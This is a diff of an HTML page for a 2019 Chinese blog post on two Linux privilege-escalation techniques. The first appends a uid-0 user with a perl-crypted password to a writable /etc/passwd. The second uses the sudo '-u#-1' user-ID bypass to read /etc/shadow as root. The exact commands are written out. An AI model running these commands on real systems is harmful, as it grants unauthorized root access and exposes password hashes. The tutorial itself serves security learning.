@@ -79,12 +79,12 @@
 
 
 
-<meta name="description" content="这两种方法利用场景比较局限，就当增加一些思路了。 1、通过可写入的&#x2F;etc&#x2F;passwd文件实现Linux提权首先了解&#x2F;etc&#x2F;passwd中的各项内容  以root为例：root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashroot：用户名。x：放置用户密码。密码直接从“&#x2F;etc&#x2F;shadow”文件中获取。0：root用户UID。0：root用户GID。root：用户描述的占位符。&#x2F;ro">
+<meta name="description" content="这两种方法利用场景比较局限，就当增加一些思路了。 1、通过可写入的&#x2F;etc&#x2F;passwd文件实现Linux提权首先了解&#x2F;etc&#x2F;passwd中的各项内容  以root为例：root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash 1234567root：用户名。x：放置用户密码。密码直接从“&#x2F;etc&#x2F;shadow”文件中获取。0：root用户UID。0：root用户GID。root：用户描述">
 <meta property="og:type" content="article">
 <meta property="og:title" content="两种鸡肋的提权方法">
 <meta property="og:url" content="http://yoursite.com/2019/11/08/%E4%B8%A4%E7%A7%8D%E9%B8%A1%E8%82%8B%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95/index.html">
 <meta property="og:site_name" content="Sharp_T&#39;s Blog">
-<meta property="og:description" content="这两种方法利用场景比较局限，就当增加一些思路了。 1、通过可写入的&#x2F;etc&#x2F;passwd文件实现Linux提权首先了解&#x2F;etc&#x2F;passwd中的各项内容  以root为例：root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashroot：用户名。x：放置用户密码。密码直接从“&#x2F;etc&#x2F;shadow”文件中获取。0：root用户UID。0：root用户GID。root：用户描述的占位符。&#x2F;ro">
+<meta property="og:description" content="这两种方法利用场景比较局限，就当增加一些思路了。 1、通过可写入的&#x2F;etc&#x2F;passwd文件实现Linux提权首先了解&#x2F;etc&#x2F;passwd中的各项内容  以root为例：root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash 1234567root：用户名。x：放置用户密码。密码直接从“&#x2F;etc&#x2F;shadow”文件中获取。0：root用户UID。0：root用户GID。root：用户描述">
 <meta property="og:image" content="https://ftp.bmp.ovh/imgs/2019/10/63cf4f3f319a1518.png">
 <meta property="og:image" content="https://ftp.bmp.ovh/imgs/2019/10/007bdaef8608ac5d.png">
 <meta property="og:image" content="https://ftp.bmp.ovh/imgs/2019/10/63cb7cbe9f328658.png">
@@ -100,7 +100,7 @@
 <meta property="og:image" content="https://ftp.bmp.ovh/imgs/2019/10/bf346ae94dd1ed90.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/10/16/KkAJGd.png">
 <meta property="article:published_time" content="2019-11-08T02:01:18.000Z">
-<meta property="article:modified_time" content="2020-01-10T09:51:46.880Z">
+<meta property="article:modified_time" content="2020-06-19T16:06:13.660Z">
 <meta property="article:author" content="Sharp_T">
 <meta property="article:tag" content="Linux提权">
 <meta name="twitter:card" content="summary">
@@ -359,7 +359,9 @@
         <p>这两种方法利用场景比较局限，就当增加一些思路了。</p>
 <h3 id="1、通过可写入的-etc-passwd文件实现Linux提权"><a href="#1、通过可写入的-etc-passwd文件实现Linux提权" class="headerlink" title="1、通过可写入的/etc/passwd文件实现Linux提权"></a>1、通过可写入的/etc/passwd文件实现Linux提权</h3><p>首先了解/etc/passwd中的各项内容</p>
 <p><img src="https://ftp.bmp.ovh/imgs/2019/10/63cf4f3f319a1518.png" alt=""></p>
-<p>以root为例：root:x:0:0:root:/root:/bin/bash<br><em>root：用户名。<br>x：放置用户密码。密码直接从“/etc/shadow”文件中获取。<br>0：root用户UID。<br>0：root用户GID。<br>root：用户描述的占位符。<br>/root：用户的家目录。将在终端会话中向用户显示该目录。<br>/bin/bash：用户的shell。根据用户的目的，将在用户登录时生成此shell</em></p>
+<p>以root为例：root:x:0:0:root:/root:/bin/bash</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root：用户名。</span><br><span class="line">x：放置用户密码。密码直接从“<span class="string">/etc/shadow</span>”文件中获取。</span><br><span class="line">0：root用户UID。</span><br><span class="line">0：root用户GID。</span><br><span class="line">root：用户描述的占位符。</span><br><span class="line"><span class="string">/root</span>：用户的家目录。将在终端会话中向用户显示该目录。</span><br><span class="line"><span class="string">/bin/bash</span>：用户的shell。根据用户的目的，将在用户登录时生成此shell*</span><br></pre></td></tr></table></figure>
+
 <p>拥有一个低权限的shell之后，我们可以利用python脚本快速获取目标机器的配置信息。</p>
 <p>Linux提权辅助脚本：</p>
 <p><code>https://www.securitysift.com/download/linuxprivchecker.py</code></p>
@@ -370,15 +372,19 @@
 <p><strong>我们写一个uid=0 gid=0的用户，即可提权！</strong></p>
 <p>难点：<strong>密码</strong>！（写入的时候必须写入密码）</p>
 <p>**可以使用perl语言生成带有salt的加密密码</p>
-<p><code>perl -le &#39;print crypt(&quot;PASSWD&quot;,&quot;SALT&quot;)&#39;</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel=""><figure class="iseeu highlight /lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -le 'print crypt(<span class="string">"PASSWD"</span>,<span class="string">"SALT"</span>)</span><br></pre></td></tr></table></figure></div>
+
 <p><img src="https://ftp.bmp.ovh/imgs/2019/10/63cb7cbe9f328658.png" alt=""></p>
 <p>写文件：</p>
-<pre><code>`echo &quot;testtest:sakqI9tJcMmO.:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd`</code></pre><p><img src="https://ftp.bmp.ovh/imgs/2019/10/38adb98547c9d109.png" alt=""></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"testtest:sakqI9tJcMmO.:0:0:User_like_root:/root:/bin/bash"</span> &gt;&gt; <span class="string">/etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ftp.bmp.ovh/imgs/2019/10/38adb98547c9d109.png" alt=""></p>
 <p>切换为添加的testtest用户，成功提权！</p>
 <p><img src="https://ftp.bmp.ovh/imgs/2019/10/52aafc5cb48cd15c.png" alt=""></p>
 <h3 id="2、sudo-权限绕过"><a href="#2、sudo-权限绕过" class="headerlink" title="2、sudo 权限绕过"></a>2、sudo 权限绕过</h3><p><strong>影响范围：</strong>sudo 1.8.28 之前的所有版本</p>
 <p><strong>漏洞成因：</strong>sudo 将用户 ID 转换为用户名的函数会将 -1（或无效等效的 4294967295）误认为是 0，而这正好是 root 用户 User ID</p>
-<p><code>sudo -V</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel=""><figure class="iseeu highlight /ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -V</span></span><br></pre></td></tr></table></figure></div>
+
 <p><img src="https://ftp.bmp.ovh/imgs/2019/10/8dc0f03b1d781de5.png" alt=""></p>
 <p>使用一个普通用户</p>
 <p><img src="https://ftp.bmp.ovh/imgs/2019/10/dc043d2e85c27b87.png" alt=""></p>
@@ -394,9 +400,11 @@
 <p>使用<code>sudo -u#-1 vim</code> 绕过限制，并以root权限查看/etc/shadow文件</p>
 <p><img src="https://s2.ax1x.com/2019/10/16/KkAuKx.png" alt=""></p>
 <p>还有一种更常见也更简单的配置sudo方式，root用户将test用户加入到sudo组中</p>
-<p><code>usermod -a -G sudo test</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel=""><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -a -G sudo <span class="built_in">test</span></span><br></pre></td></tr></table></figure></div>
+
 <p>使用test用户执行：</p>
-<p><code>sudo -u#0 /bin/bash</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel=""><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> -u<span class="comment">#0 /bin/bash</span></span><br></pre></td></tr></table></figure></div>
+
 <p><img src="https://ftp.bmp.ovh/imgs/2019/10/bf346ae94dd1ed90.png" alt=""></p>
 <p>这样直接就可以切换到root，是因为test用户拥有了sudo执行所有的权限。</p>
 <p><img src="https://s2.ax1x.com/2019/10/16/KkAJGd.png" alt=""></p>
